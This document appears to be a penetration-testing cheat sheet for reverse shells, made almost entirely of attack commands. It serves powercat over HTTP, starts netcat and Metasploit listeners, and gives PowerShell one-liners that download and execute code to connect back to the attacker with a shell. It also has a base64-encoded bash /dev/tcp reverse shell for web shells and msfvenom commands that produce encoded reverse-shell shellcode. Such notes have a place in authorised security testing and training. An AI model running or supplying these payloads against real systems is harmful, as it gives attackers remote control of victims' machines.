# Reverse Shells

Serve Powercat.ps1

```bash
cd /usr/share/windows-resources && python3 -m http.server 80
```

Start listener

```
rlwrap nc -lvnp 4444
```

Run one of the commands:

{% tabs %}
{% tab title="Batch" %}
```batch
powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('http://<local_host>/powercat.ps1'); powercat -c <local_host> -p <local_port> -e powershell"
```
{% endtab %}

{% tab title="Powershell" %}
```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://<local_host>/powercat.ps1");powercat -c <local_host> -p <local_port> -e powershell 
```
{% endtab %}
{% endtabs %}

Base64 Encoded Bash - useful for web shells.

```bash
echo 'bash -i>& /dev/tcp/<ip>/4444 0>&1' | base64
```

Generating shell code

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell -v sc
```

Generating obfuscated shell code with bad words:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Start meterpreter listener one-liner

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```
